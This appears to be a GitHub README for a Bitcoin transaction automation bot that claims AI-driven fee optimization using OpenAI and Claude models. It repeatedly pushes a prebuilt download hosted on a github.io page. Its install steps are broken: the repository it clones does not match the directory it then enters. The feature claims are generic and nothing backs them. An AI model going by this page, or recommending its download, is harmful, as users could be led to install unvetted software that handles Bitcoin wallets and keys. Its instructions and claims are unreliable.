# Btc Transaction Bot Orchestration Engine v9.5.2 - Bitcoin Transaction Automation 2026

> **A non-custodial orchestration engine for automating Bitcoin transactions with AI-driven fee optimization, mempool analysis, and multi-wallet support, built for power users and institutions that need deterministic execution on Linux, macOS, and Windows (WSL2).**

[![Platform](https://img.shields.io/badge/Platform-Linux%2C%20macOS%2C%20Windows%20(WSL2)-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v9.5.2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henryscottrs8618/btc-mempool-execute-bot?style=flat-square)](https://github.com/henryscottrs8618/btc-mempool-execute-bot)

---

<p align="center">
  <a href="https://henryscottrs8618.github.io/btc-mempool-execute-bot/">
    <img src="https://img.shields.io/badge/Download-Btc%20Transaction%20Bot%20Latest-brightgreen?style=for-the-badge" alt="Download Btc Transaction Bot">
  </a>
</p>

> **[Direct Download - Btc Transaction Bot v9.5.2](https://henryscottrs8618.github.io/btc-mempool-execute-bot/)**

---

[Download Latest Build](https://henryscottrs8618.github.io/btc-mempool-execute-bot/)

---

## Overview of Btc Transaction Bot Orchestration Engine

Btc Transaction Bot Orchestration Engine combines Bitcoin transaction automation with an AI-assisted fee layer that reacts to live mempool conditions. Rather than relying on manual fee guesses or rough confirmation estimates, the system consults OpenAI and Claude models to recommend pricing, then carries out transactions through cold storage or HSM-backed wallets. It targets operators who value consistency, traceability, and multilingual workflows across distributed teams.

A rehearsal mode is included so you can simulate transfers without broadcasting them to the network, which is helpful when validating multi-wallet sequences or checking fee behavior before production use. Notification options cover console output, webhooks, and email, so teams can plug into the channel they already use. If you want a visual layer, an optional React dashboard with WebSocket-based live updates is available for monitoring.

---

## Core Capabilities

- **AI-assisted fee optimization** with OpenAI and Claude models for mempool-aware pricing decisions
- **Rehearsal mode** for testing transactions without committing them on-chain
- **Multi-channel alerting** through console, webhook, and email notifications
- **Multi-wallet derivation** with HSM integration for cold storage workflows
- **YAML audit trail output** for compliance tracking and documentation
- **Optional React dashboard** with WebSocket visualization for real-time oversight
- **Multilingual guidance layer** supporting English, Spanish, Mandarin, and Arabic
- **24/7 diagnostics daemon** for health checks and automatic support bundle creation

---

## Installation

Clone the repository and prepare the engine:

```bash
git clone https://github.com/henryscottrs8618/btc-mempool-execute-bot.git
cd btc-txn-bot-orchestration-engine-v9.5.2
```

Run the bootstrap script for initial setup:

```bash
./setup.sh --init
```

On Windows (WSL2), make sure Python 3.10+ and Node.js 18+ are installed before launching the script.

---

## Usage

Launch the orchestration daemon:

```bash
./btc-orchestrator start
```

To simulate a transaction in rehearsal mode:

```bash
./btc-orchestrator rehearse --wallet cold-storage-1 --amount 0.05 --fee-model claude
```

For production execution with notifications enabled:

```bash
./btc-orchestrator execute --config production.yaml --alert email,webhook
```

Open the dashboard when it is enabled:

```bash
./btc-orchestrator dashboard --port 3000
```

---

## Configuration

All configuration lives in `config/orchestrator.yaml`. The main sections are shown below:

```yaml
wallets:
  cold-storage-1:
    hsm: true
    derivation: bip84
fee_models:
  openai:
    model: gpt-4
  claude:
    model: claude-3-opus
alerts:
  email:
    smtp_host: smtp.example.com
  webhook:
    url: https://hooks.example.com/btc
```

Environment variables can override these values - see `.env.example` for the complete list.

---

## Requirements

- **Operating Systems:** Linux (Ubuntu 22.04+), macOS (Ventura+), Windows 10/11 via WSL2
- **Runtime:** Python 3.10+, Node.js 18+ (for dashboard), Go 1.21+ (for HSM modules)
- **Storage:** 500 MB for engine files, plus 2 GB for mempool cache and audit logs
- **Network:** Outbound HTTPS access for AI model APIs and Bitcoin node RPC
- **Bitcoin Node:** A running Bitcoin Core instance (v25+) with RPC enabled

---

## FAQ

**How do I refresh the AI models?**  
Model definitions are loaded from `config/fee_models.yaml`. Change the API keys or model names there, then restart the daemon.

**Is the dashboard required?**  
No. The command-line engine works on its own, and the React dashboard is only an optional visualization layer.

**How are transactions protected?**  
Signing happens locally with cold storage or HSM-backed keys. The engine remains non-custodial and does not retain private keys.

**What if the mempool shifts during rehearsal?**  
Rehearsal mode operates against a mempool snapshot captured at execution time. If you need live recalculation, use production mode with real-time fee optimization.

**How do I create a support bundle?**  
Run `./btc-orchestrator diagnostics` to generate a compressed bundle containing logs, configuration, and system details.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
